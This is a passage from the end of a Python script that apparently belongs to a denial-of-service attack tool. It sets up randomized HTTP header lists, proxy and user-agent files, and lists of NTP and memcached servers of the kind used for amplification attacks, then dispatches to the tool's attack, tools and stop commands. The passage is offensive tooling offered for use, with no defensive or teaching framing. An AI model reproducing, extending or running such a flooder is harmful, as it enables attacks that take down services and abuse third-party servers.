        open(text, 'w').close()
    print('File: ', text)

if __name__ == '__main__':
    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
    from time import sleep
    from icmplib import ping as pig
    from scapy.layers.inet import TCP
    from scapy.all import *
    from socket import gaierror
    acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
    ]

    data = ""
    strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
    Intn = random.randint
    Choice = random.choice
    if not os.path.exists('files/'):
        makefile('files/')
    if not os.path.exists('files/proxys/'):
        makefile('files/proxys/')
    if not os.path.exists('files/useragent.txt'):
        makefile('files/proxys/useragent.txt')
    if not os.path.exists('files/ntp_servers.txt'):
        makefile('files/ntp_servers.txt')
    if not os.path.exists('files/memcached_servers.txt'):
        makefile('files/memcached_servers.txt')
    if not os.path.exists('files/referers.txt'):
        makefile('files/referers.txt')
    try:
        with open("files/useragent.txt", "r") as f:
            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/referers.txt", "r") as f:
            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/memcached_servers.txt", "r") as f:
            memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/ntp_servers.txt", "r") as f:
            ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        UserAgent = Choice(readuser)
        referers = Choice(readref)
        memcached_servers = Choice(memsv)
        try:
            bdr = str(sys.argv[1]).lower()
            if bdr == "tools":
                tools()
            elif bdr == "stop":
                stop()
            elif bdr == "help":
                usge()
            elif len(sys.argv) <= int(7):
                usge()
            else:
                main()
        except IndexError:
            usge()
    except KeyboardInterrupt:
        sys.exit()
    except IndexError:
        usge()
